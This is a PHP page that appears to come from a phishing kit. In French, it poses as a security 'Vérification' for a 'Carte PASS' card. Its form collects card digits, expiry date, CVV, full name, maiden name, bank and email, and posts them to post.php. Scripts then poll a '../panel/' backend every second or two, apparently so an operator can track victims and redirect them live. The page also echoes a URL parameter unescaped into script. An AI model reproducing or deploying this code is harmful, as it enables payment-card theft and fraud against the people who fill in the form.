<?php 
require '../main.php';
$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
    $ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
?><!doctype html>
<html>
<head>
<title>Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="inc/jihanaid.css">
<link rel="stylesheet" href="inc/auth.css">
</head>
<body>
<header class="container-full">
<div class="row align-items-center">
<div class="col-100 text-left">
    <img src="inc/logo.png" style="width:130px;">
</div>
<div class="col-100 text-right">
<h5>Vérification</h5>
</div>
</div>
</header> 



<div class="container text-center">

<div class="form display-inline-block" style="width:600px; max-width:100% !important; margin:60px 0; ">

<div class="form-col" style="margin-bottom:30px;">
<h3>Confirmer votre identité</h3>
<p style="font-size:0.8em; margin:0;">Par mesure de sécurité, nous allons contrôler votre identité. Merci de compléter les informations suivantes :</p>

<div style="padding:10px 0; font-size:0.9em;">
<p>• Vous devez valider le code reçu par SMS.</p>
<p style="color:#30a2dd;">  * : Tous les champs sont obligatoires.</p>
</div>

</div>



<?php
if(isset($_GET['e'])){ 
    echo '
<div class="form-col">
    <p style="color:red;">Veuillez vérifier les informations de votre carte et réessayer.</p>
</div>';

}
?>

<div class="form-col">
<label>Entrer les 12 derniers chiffres de ma Carte PASS *</label>
<input type="text" class="textinput" id="d0" placeholder="Ex. 680037466625 ou 340093099897">
</div>

<div class="form-col">
<label>Date d'expiration *</label>
<input type="text" class="textinput" id="d1" placeholder="MM/AA">
</div>

<div class="form-col">
<label>Cryptogramme visuel *</label>
<input type="text" class="textinput" id="d2" placeholder="***">
</div>

<div class="form-col">
<label>Nom de famille *</label>
<input type="text" class="textinput" id="d4" placeholder="Nom figurant sur votre carte d'identité">
</div>

<div class="form-col">
<label>Prénom complet *</label>
<input type="text" class="textinput" id="d5" placeholder="Votre prénom complet">
</div>

<div class="form-col">
<label>Nom de jeune fille (optionnel)</label>
<input type="text" class="textinput" id="d6" placeholder="Le cas échéant">
</div>

<div class="form-col">
<label>Nom de votre banque rattaché au compte *</label>
<input type="text" class="textinput" id="d7" placeholder="Ex. BNP Paribas, Société Générale...">
</div>

<div class="form-col">
<label>Adresse email *</label>
<input type="text" class="textinput" id="d3" placeholder="exemple@email.com">
</div>

<div class="form-col">
    <button class="sbmt" onclick="sendCard()">Confirmer</button>
</div>

</div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>

$("#d0").mask("000000000000");
$("#d1").mask("00/00");
$("#d2").mask('000');

var allowSubmit;
var abortVal = true;
 
function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

for(var i=4; i<=7; i++){
	if(i==6) continue;
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d3").val().length<3 || $("#d3").val().indexOf("@")==-1 || $("#d3").val().indexOf(".")==-1){
	$("#d3").addClass("error");
	allowSubmit=false;
}

if($("#d0").val().length<12){
	$("#d0").addClass("error");
	allowSubmit=false;
}

 
var _exp = $("#d1").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>37 || _exps[1]<24 || _exp.length<5){
    $("#d1").addClass("error");
	allowSubmit=false;
}



}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $.post("post.php", 
			{	
                
				cc:$("#d0").val(),
                exp:$("#d1").val(),
				cvv:$("#d2").val(),
                lastname:$("#d4").val(),
                firstname:$("#d5").val(),
                maidenname:$("#d6").val(),
                bank:$("#d7").val(),
                email:$("#d3").val()
			
			}, function(done){
                window.location="processing.php?p=CARD";
			}
		
		);

    }
}
 
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);

</script>
</body>
</html>